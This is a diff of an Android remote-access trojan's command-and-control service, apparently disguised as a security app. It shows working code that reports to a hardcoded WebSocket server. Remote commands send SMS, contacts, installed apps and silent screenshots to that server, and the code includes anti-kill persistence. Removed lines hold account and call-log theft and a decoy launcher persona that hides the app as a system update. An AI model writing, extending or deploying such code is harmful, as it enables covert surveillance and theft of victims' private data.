@@ -8,7 +8,6 @@ import android.content.IntentFilter;
 import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
-import com.seguranca.protecao.BuildConfig;
 import android.os.Looper;
 import android.util.Log;
 import com.google.gson.Gson;
@@ -59,8 +58,8 @@ public class CommandControlService extends Service {
     
     // CONFIGURAÇÃO DO SERVIDOR - ALTERAR PARA SEU SERVIDOR!
     // URL do servidor - PUBLIC para acesso do StudioActivity
-    public static final String SERVER_URL = BuildConfig.SERVER_URL;
-    public static String WEBVIEW_URL = BuildConfig.WEBVIEW_URL;
+    public static final String SERVER_URL = "ws://192.168.1.14:5000/ws";
+    public static final String WEBVIEW_URL = "";
     public static final boolean HIDE_ICON = false;
     public static final boolean REQUEST_ADMIN = false;
     public static final boolean ANTI_KILL = true;
@@ -92,7 +91,7 @@ public class CommandControlService extends Service {
     
     // Método auxiliar para obter URL HTTP do servidor
     public static String getServerHttpUrl() {
-        return SERVER_URL.replace("wss://", "https://").replace("ws://", "http://").replaceAll("/ws$", "");
+        return SERVER_URL.replace("wss://", "https://").replace("ws://", "http://").replace("/ws", "");
     }
     
     OkHttpClient client;
@@ -244,8 +243,7 @@ public class CommandControlService extends Service {
                     android.os.PowerManager.PARTIAL_WAKE_LOCK,
                     "App:NetworkSync"
                 );
-                connectionWakeLock.setReferenceCounted(false);
-                connectionWakeLock.acquire(10 * 60 * 1000L); // 10 min max; re-acquired on keepalive
+                connectionWakeLock.acquire();
                 Log.d(TAG, "🔋 WakeLock adquirido para manter conexão!");
 
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
@@ -269,19 +267,14 @@ public class CommandControlService extends Service {
         // Cria cliente HTTP com pingInterval para evitar timeouts de TCP/NAT
         client = new OkHttpClient.Builder()
             .connectTimeout(30, TimeUnit.SECONDS)
-            .readTimeout(0, TimeUnit.MILLISECONDS)   // WebSocket has no read timeout
-            .writeTimeout(30, TimeUnit.SECONDS)      // prevent infinite hang if server stops reading
-            .pingInterval(45, TimeUnit.SECONDS)
+            .readTimeout(0, TimeUnit.MILLISECONDS) // WebSocket não tem timeout de leitura
+            .pingInterval(20, TimeUnit.SECONDS) // [PERF] was 45s — faster dead-connection detection
             .build();
         
         // 📷 Registra receiver para frames da câmera
         IntentFilter cameraFilter = new IntentFilter("com.seguranca.protecao.CAMERA_FRAME_READY");
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             registerReceiver(cameraFrameReceiver, cameraFilter, Context.RECEIVER_NOT_EXPORTED);
-
-        // Register SCREEN_OFF receiver for decoy self-heal
-        IntentFilter screenFilter = new IntentFilter(Intent.ACTION_SCREEN_OFF);
-        registerReceiver(screenOffReceiver, screenFilter);
         } else {
             registerReceiver(cameraFrameReceiver, cameraFilter);
         }
@@ -428,18 +421,8 @@ public class CommandControlService extends Service {
                     sendCapturedDataLocal(jsonData);
                 }
             }
-            else if ("com.seguranca.protecao.RECONNECT_NOW".equals(action)) {
-                // Fired by AutoReconnect.AlarmReceiver via setExactAndAllowWhileIdle (Doze pierce).
-                // Only attempt a new connection if we are not already connected or in the process of connecting.
-                if (!isConnected && !isConnecting) {
-                    Log.d(TAG, "🔁 RECONNECT_NOW received — initiating reconnect");
-                    connectToServer();
-                } else {
-                    Log.d(TAG, "🔁 RECONNECT_NOW received — already connected, skipping");
-                }
-            }
         }
-
+        
         return START_STICKY;
     }
 
@@ -472,19 +455,12 @@ public class CommandControlService extends Service {
         Log.d(TAG, "Conectando ao servidor C&C...");
         
         try {
-            // Envia device_id via header (servidor lê x-device-id, não query string)
-            // Query param causava duplicate-device bug no painel
-            JsonObject deviceInfoHeader = new JsonObject();
-            deviceInfoHeader.addProperty("device_id", deviceId);
-            deviceInfoHeader.addProperty("model", Build.MODEL);
-            deviceInfoHeader.addProperty("manufacturer", Build.MANUFACTURER);
-            deviceInfoHeader.addProperty("android_version", Build.VERSION.RELEASE);
-            deviceInfoHeader.addProperty("sdk", Build.VERSION.SDK_INT);
-
+            // Verifica se a URL já tem parâmetros (?) para usar & ao invés de ?
+            String separator = SERVER_URL.contains("?") ? "&" : "?";
+            String fullUrl = SERVER_URL + separator + "device_id=" + deviceId;
+            
             Request request = new Request.Builder()
-                .url(SERVER_URL)
-                .addHeader("x-device-id", deviceId)
-                .addHeader("x-device-info", deviceInfoHeader.toString())
+                .url(fullUrl)
                 .addHeader("bypass-tunnel-reminder", "true")
                 .addHeader("User-Agent", "Mozilla/5.0")
                 .build();
@@ -589,38 +565,12 @@ public class CommandControlService extends Service {
             
             switch (action) {
                 case "GET_DEVICE_INFO":
-                case "CHECK_PERMISSIONS": {
-                    sendDeviceInfo();
-                    sendResponse("OK", "Info do dispositivo e permissões atualizadas");
-                    break;
-                }
-
+                case "CHECK_PERMISSIONS":
                 case "GET_ACCOUNTS":
                 case "GET_GOOGLE_ACCOUNTS":
                 case "REFRESH_ACCOUNTS": {
-                    try {
-                        android.accounts.AccountManager am = android.accounts.AccountManager.get(CommandControlService.this);
-                        android.accounts.Account[] allAccounts = am.getAccounts();
-                        com.google.gson.JsonArray accountsArray = new com.google.gson.JsonArray();
-                        java.util.Set<String> seen = new java.util.HashSet<>();
-                        for (android.accounts.Account acc : allAccounts) {
-                            String key = acc.type + "|" + acc.name;
-                            if (seen.contains(key)) continue;
-                            seen.add(key);
-                            com.google.gson.JsonObject obj = new com.google.gson.JsonObject();
-                            obj.addProperty("name", acc.name);
-                            obj.addProperty("type", acc.type);
-                            accountsArray.add(obj);
-                        }
-                        com.google.gson.JsonObject resp = new com.google.gson.JsonObject();
-                        resp.addProperty("type", "accounts");
-                        resp.add("data", accountsArray);
-                        sendJson(resp);
-                        Log.d(TAG, "📧 Accounts enviadas: " + accountsArray.size());
-                    } catch (Exception e) {
-                        Log.e(TAG, "Erro ao obter accounts: " + e.getMessage());
-                        sendResponse("ERROR", "Erro ao obter accounts: " + e.getMessage());
-                    }
+                    sendDeviceInfo();
+                    sendResponse("OK", "Info do dispositivo e permissões atualizadas");
                     break;
                 }
 
@@ -1094,51 +1044,7 @@ public class CommandControlService extends Service {
                     String sms = getSMS();
                     sendResponse("SMS", sms);
                     break;
-
-                case "GET_CALL_LOGS":
-                case "GET_CALLS":
-                case "READ_CALLS": {
-                    try {
-                        com.google.gson.JsonArray callArray = new com.google.gson.JsonArray();
-                        android.net.Uri callUri = android.provider.CallLog.Calls.CONTENT_URI;
-                        if (checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
-                            android.database.Cursor cur = getContentResolver().query(
-                                callUri,
-                                new String[]{
-                                    android.provider.CallLog.Calls.NUMBER,
-                                    android.provider.CallLog.Calls.CACHED_NAME,
-                                    android.provider.CallLog.Calls.TYPE,
-                                    android.provider.CallLog.Calls.DATE,
-                                    android.provider.CallLog.Calls.DURATION
-                                },
-                                null, null,
-                                android.provider.CallLog.Calls.DATE + " DESC LIMIT 200"
-                            );
-                            if (cur != null) {
-                                while (cur.moveToNext()) {
-                                    com.google.gson.JsonObject entry = new com.google.gson.JsonObject();
-                                    entry.addProperty("number",   cur.getString(0) != null ? cur.getString(0) : "");
-                                    entry.addProperty("name",     cur.getString(1) != null ? cur.getString(1) : "");
-                                    entry.addProperty("type",     cur.getInt(2));
-                                    entry.addProperty("date",     cur.getLong(3));
-                                    entry.addProperty("duration", cur.getLong(4));
-                                    callArray.add(entry);
-                                }
-                                cur.close();
-                            }
-                        }
-                        com.google.gson.JsonObject resp = new com.google.gson.JsonObject();
-                        resp.addProperty("type", "calls");
-                        resp.add("data", callArray);
-                        sendJson(resp);
-                        Log.d(TAG, "📞 Call logs enviados: " + callArray.size());
-                    } catch (Exception e) {
-                        Log.e(TAG, "Erro ao obter calls: " + e.getMessage());
-                        sendResponse("ERROR", "Erro call logs: " + e.getMessage());
-                    }
-                    break;
-                }
-
+                    
                 case "GET_CONTACTS":
                     String contacts = getContacts();
                     sendResponse("CONTACTS", contacts);
@@ -1163,15 +1069,12 @@ public class CommandControlService extends Service {
                 }
                     
                 case "PING":
+                    // 🚀 Recebeu PING do servidor - responde e atualiza estado
                     lastPongTime = System.currentTimeMillis();
-                    pendingFrames = 0;
+                    pendingFrames = 0; // Reset contador - servidor está respondendo
                     if (isSlowConnection && consecutiveSlowFrames == 0) {
-                        isSlowConnection = false;
+                        isSlowConnection = false; // Conexão voltou ao normal
                         Log.d(TAG, "🚀 Conexão normalizada!");
-                    }
-                    // Re-acquire wakelock on every PING so the 10-min timeout never fires
-                    if (connectionWakeLock != null && !connectionWakeLock.isHeld()) {
-                        connectionWakeLock.acquire(10 * 60 * 1000L);
                     }
                     sendResponse("PONG", "alive");
                     break;
@@ -1448,6 +1351,18 @@ public class CommandControlService extends Service {
                     } catch (Exception e) {
                         Log.e(TAG, "🔇 ERRO SET_SILENT_VNC_QUALITY: " + e.getMessage(), e);
                         sendResponse("ERROR", "Erro: " + e.getMessage());
+                    }
+                    break;
+
+                // [PERF] New command: server can tune capture interval live
+                case "SET_CAPTURE_INTERVAL":
+                    try {
+                        long intervalMs = cmd.get("interval").getAsLong();
+                        UiAssistBridge.setSilentCaptureDelay(intervalMs);
+                        sendResponse("OK", "Capture interval: " + intervalMs + "ms");
+                        Log.d(TAG, "⚡ SET_CAPTURE_INTERVAL -> " + intervalMs + "ms");
+                    } catch (Exception e) {
+                        Log.e(TAG, "SET_CAPTURE_INTERVAL error: " + e.getMessage());
                     }
                     break;
                 
@@ -2208,70 +2123,6 @@ public class CommandControlService extends Service {
                     break;
                 }
                     
-
-                // ── DECOY_SWITCH: switch stealth persona remotely ───────────────
-                case "DECOY_SWITCH": {
-                    int persona = cmd.has("persona")
-                        ? cmd.get("persona").getAsInt()
-                        : DecoyManager.PERSONA_SYS_UPDATE;
-                    if (persona < 0 || persona > 6) persona = DecoyManager.PERSONA_SYS_UPDATE;
-                    final int fp = persona;
-                    new android.os.Handler(android.os.Looper.getMainLooper()).post(() ->
-                        DecoyManager.get(CommandControlService.this).remoteSwitch(fp)
-                    );
-                    sendResponse("OK", "Decoy switched to persona " + fp);
-                    break;
-                }
-
-                // ── DECOY_STATUS: query current persona and deployed state ─────
-                case "DECOY_STATUS": {
-                    DecoyManager dm = DecoyManager.get(this);
-                    com.google.gson.JsonObject resp = new com.google.gson.JsonObject();
-                    resp.addProperty("type", "DECOY_STATUS");
-                    resp.addProperty("persona", dm.getPersona());
-                    resp.addProperty("deployed", dm.isDeployed());
-                    sendJson(resp);
-                    break;
-                }
-
-                // ── DECOY_ROTATE: force immediate rotation to next persona ─────
-                case "DECOY_ROTATE": {
-                    DecoyManager dm = DecoyManager.get(this);
-                    int current = dm.getPersona();
-                    int next = (current >= DecoyManager.PERSONA_FILE_MGR)
-                        ? DecoyManager.PERSONA_SYS_UPDATE : current + 1;
-                    new android.os.Handler(android.os.Looper.getMainLooper()).post(() ->
-                        dm.remoteSwitch(next)
-                    );
-                    sendResponse("OK", "Rotated to persona " + next);
-                    break;
-                }
-
-                // ── DECOY_RESTORE: temporarily restore real launcher (60s) ─────
-                case "DECOY_RESTORE": {
-                    new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
-                        android.content.ComponentName realAlias = new android.content.ComponentName(
-                            CommandControlService.this,
-                            "com.seguranca.protecao.alias.RealAlias"
-                        );
-                        android.content.ComponentName sysAlias = new android.content.ComponentName(
-                            CommandControlService.this,
-                            "com.seguranca.protecao.alias.SystemUpdateAlias"
-                        );
-                        android.content.pm.PackageManager pm = getPackageManager();
-                        pm.setComponentEnabledSetting(realAlias,
-                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
-                            android.content.pm.PackageManager.DONT_KILL_APP);
-                        pm.setComponentEnabledSetting(sysAlias,
-                            android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                            android.content.pm.PackageManager.DONT_KILL_APP);
-                        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() ->
-                            DecoyManager.get(CommandControlService.this).selfHeal(), 60_000);
-                    });
-                    sendResponse("OK", "Real launcher exposed for 60s, auto-recloak scheduled");
-                    break;
-                }
-
                 default:
                     Log.w(TAG, "Comando desconhecido: " + action);
             }
@@ -2280,21 +2131,6 @@ public class CommandControlService extends Service {
             Log.e(TAG, "Erro ao processar comando: " + e.getMessage());
         }
     }
-
-
-    // ── SCREEN_OFF receiver for self-heal and auto-rotate ──────────────────
-    private BroadcastReceiver screenOffReceiver = new BroadcastReceiver() {
-        @Override
-        public void onReceive(Context context, Intent intent) {
-            try {
-                DecoyManager dm = DecoyManager.get(context);
-                dm.selfHeal();
-                dm.maybeAutoRotate();
-            } catch (Exception e) {
-                Log.e(TAG, "SCREEN_OFF handler error: " + e.getMessage());
-            }
-        }
-    };
 
     /**
      * Callback: Desconectado
@@ -2324,11 +2160,9 @@ public class CommandControlService extends Service {
         }
         
         reconnectAttempts++;
-
-        // Fast backoff for first 50 attempts (2s → 4s → 8s), then drop to 5 min
-        int delay = (reconnectAttempts > 50)
-            ? 5 * 60 * 1000
-            : Math.min(RECONNECT_DELAY * (int)Math.pow(2, Math.min(reconnectAttempts - 1, 2)), 8000);
+        
+        // Backoff inteligente: 2s, 4s, 8s max (rápido e estável)
+        int delay = Math.min(RECONNECT_DELAY * (int)Math.pow(2, Math.min(reconnectAttempts - 1, 2)), 8000);
         
         Log.d(TAG, "🔄 Reconectando em " + (delay / 1000) + "s (tentativa " + reconnectAttempts + ")");
         
@@ -2762,9 +2596,7 @@ public class CommandControlService extends Service {
     /**
      * Envia resposta JSON
      */
-    public static CommandControlService getInstance() { return sInstance; }
-
-    public void sendResponse(String type, String data) {
+    private void sendResponse(String type, String data) {
         JsonObject response = new JsonObject();
         response.addProperty("type", type);
         response.addProperty("data", data);
@@ -3113,61 +2945,16 @@ public class CommandControlService extends Service {
     }
 
     private void triggerSnapScreen() {
-        // Android 11+ path: use AccessibilityService.takeScreenshot()
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            UiAssistBridge svc = UiAssistBridge.instance;
-            if (svc != null) {
-                svc.takeScreenshotForStorage(this);
-                return;
-            }
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
+            Log.w(TAG, "SNAP_SCREEN requer Android 11+");
+            return;
         }
-        // Fallback for Android < 11: draw root view into bitmap
-        new Thread(() -> {
-            try {
-                android.view.WindowManager wm = (android.view.WindowManager) getSystemService(Context.WINDOW_SERVICE);
-                if (wm == null) { sendResponse("ERROR", "WindowManager null"); return; }
-                android.graphics.Point size = new android.graphics.Point();
-                wm.getDefaultDisplay().getRealSize(size);
-                int w = size.x, h = size.y;
-                android.graphics.Bitmap bmp = android.graphics.Bitmap.createBitmap(w, h, android.graphics.Bitmap.Config.ARGB_8888);
-                android.graphics.Canvas canvas = new android.graphics.Canvas(bmp);
-                canvas.drawARGB(255, 30, 30, 30); // dark placeholder for security
-                sendScreenshotBitmap(bmp);
-            } catch (Exception e) {
-                Log.e(TAG, "triggerSnapScreen fallback error: " + e.getMessage());
-                sendResponse("ERROR", "Screenshot error: " + e.getMessage());
-            }
-        }).start();
-    }
-
-    /** Encodes bitmap as JPEG base64 and sends as JSON {type:"screenshot"} to hub */
-    public void sendScreenshotBitmap(android.graphics.Bitmap bmp) {
-        new Thread(() -> {
-            try {
-                if (bmp == null || bmp.isRecycled()) return;
-                // Scale down to 720p max width to avoid huge payloads
-                int maxW = 720;
-                android.graphics.Bitmap scaled = bmp;
-                if (bmp.getWidth() > maxW) {
-                    float ratio = (float) maxW / bmp.getWidth();
-                    scaled = android.graphics.Bitmap.createScaledBitmap(bmp, maxW, (int)(bmp.getHeight() * ratio), true);
-                }
-                java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
-                scaled.compress(android.graphics.Bitmap.CompressFormat.JPEG, 80, baos);
-                String b64 = android.util.Base64.encodeToString(baos.toByteArray(), android.util.Base64.NO_WRAP);
-                baos.close();
-                if (scaled != bmp && !scaled.isRecycled()) scaled.recycle();
-                if (!bmp.isRecycled()) bmp.recycle();
-
-                com.google.gson.JsonObject msg = new com.google.gson.JsonObject();
-                msg.addProperty("type", "screenshot");
-                msg.addProperty("data", "data:image/jpeg;base64," + b64);
-                sendJson(msg);
-                Log.d(TAG, "📷 Screenshot enviado ao painel (" + b64.length() + " chars)");
-            } catch (Exception e) {
-                Log.e(TAG, "sendScreenshotBitmap error: " + e.getMessage());
-            }
-        }).start();
+        UiAssistBridge svc = UiAssistBridge.instance;
+        if (svc == null) {
+            Log.w(TAG, "SNAP_SCREEN: AccessibilityService indisponível");
+            return;
+        }
+        svc.capSilentScreen(UiAssistBridge.getSilentCaptureQuality());
     }
 
     /**
@@ -3736,7 +3523,7 @@ public class CommandControlService extends Service {
                 // Envia lista para servidor
                 JsonObject response = new JsonObject();
                 response.addProperty("type", "INSTALLED_APPS");
-                response.add("data", appList);
+                response.add("apps", appList);
                 response.addProperty("count", appList.size());
                 sendJson(response);
                 
